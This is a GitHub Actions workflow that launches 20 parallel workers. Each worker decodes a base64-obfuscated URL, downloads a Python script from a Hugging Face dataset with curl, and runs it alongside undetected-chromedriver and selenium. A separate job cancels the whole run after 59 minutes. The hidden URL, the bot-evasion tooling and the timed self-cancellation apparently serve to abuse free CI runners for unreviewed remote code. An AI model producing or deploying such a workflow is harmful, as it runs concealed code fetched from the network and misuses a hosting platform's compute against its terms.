name: Emerald Halo Grid

on:
  workflow_dispatch:

concurrency:
  group: emerald-halo-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Halo Keeper: idles 59 minutes, then halts the entire run
  # =================================================================
  halo-keeper:
    name: "Halo Keeper"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      KEEP_INTERVAL: 3540
    steps:
      - name: Assume Watch
        run: |
          echo "[KEEPER] Keeper has assumed watch for run: ${{ github.run_id }}"
          echo "[KEEPER] Maintaining watch for ${KEEP_INTERVAL} seconds until the boundary."

          sleep "${KEEP_INTERVAL}"

          echo "[KEEPER] Boundary crossed — dispatching halt request."

          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

          echo "[KEEPER] Halt request dispatched. Running and queued jobs will be stopped."

  # =================================================================
  # Halo Grid: parallel grid workers
  # =================================================================
  halo-grid:
    name: "GridWorker-${{ matrix.worker_handle }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        worker_handle: [GX1, HY2, IZ3, JA4, KB5, LC6, MD7, NE8, OF9, PG0, QH1, RI2, SJ3, TK4, UL5, VM6, WN7, XO8, YP9, ZQ0]

    steps:
      # #################################################################
      # Part I: Initialize the worker
      # #################################################################
      - name: Initialize Worker
        run: |
          echo "[INIT] Initializing GridWorker-${{ matrix.worker_handle }} on the runner..."
          sudo apt-get update -qq
          sudo apt-get install -y curl python3-pip

      # #################################################################
      # Part II: Obtain the grid script
      # #################################################################
      - name: Obtain Grid Script
        run: |
          echo "[OBTAIN] Obtaining grid script from endpoint..."
          SCRIPT_LOCATOR=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
          curl -sL "$SCRIPT_LOCATOR" -o grid_script.py
          echo "[OBTAIN] Grid script acquired."

      # #################################################################
      # Part III: Install helper packages
      # #################################################################
      - name: Install Helper Packages
        run: |
          echo "[HELPERS] Installing helper packages..."
          pip3 install -q undetected-chromedriver selenium requests psutil

      # #################################################################
      # Part IV: Execute grid script (3540s limit)
      # #################################################################
      - name: Execute Grid Script
        run: |
          echo ">> Executing GridWorker-${{ matrix.worker_handle }} script..."

          python3 grid_script.py &
          GRID_PID=$!

          echo ">> Worker executing. Runtime limit: 3540 seconds."

          sleep 3540

          if kill -0 "$GRID_PID" 2>/dev/null; then
            echo ">> Runtime limit reached — terminating worker."
            kill -9 "$GRID_PID"
            echo ">> Worker terminated by the runtime supervisor."
          else
            echo ">> Worker completed within the runtime limit."
          fi
